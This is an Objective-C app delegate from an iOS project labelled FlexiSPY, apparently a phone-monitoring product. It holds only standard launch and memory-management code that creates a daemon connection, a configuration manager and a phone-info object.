//
//  FlexiSPYAppDelegate.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "CyclopsAppDelegate.h"
#import "RootViewController.h"

#import "AppUIConnection.h"
#import "LicenseInfo.h"
#import "ConfigurationManagerImpl.h"
#import "PhoneInfoImp.h"

@implementation CyclopsAppDelegate

@synthesize window;
@synthesize navigationController;

@synthesize mAppUIConnection;
@synthesize mLicenseInfo;
@synthesize mConfigurationManager;
@synthesize mPhoneInfo;

#pragma mark -
#pragma mark Application lifecycle

- (void)applicationDidFinishLaunching:(UIApplication *)application {
    
    // Override point for customization after app launch    
	[window addSubview:[navigationController view]];
    [window makeKeyAndVisible];
	
	// Connection to daemon
	mAppUIConnection = [[AppUIConnection alloc] init];
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	mPhoneInfo = [[PhoneInfoImp alloc] init];
}

- (void)applicationWillTerminate:(UIApplication *)application {
	// Save data if appropriate
}

#pragma mark -
#pragma mark Memory management

- (void)dealloc {
	[mPhoneInfo release];
	[mConfigurationManager release];
	[mLicenseInfo release];
	[mAppUIConnection release];
	[navigationController release];
	[window release];
	[super dealloc];
}

@end

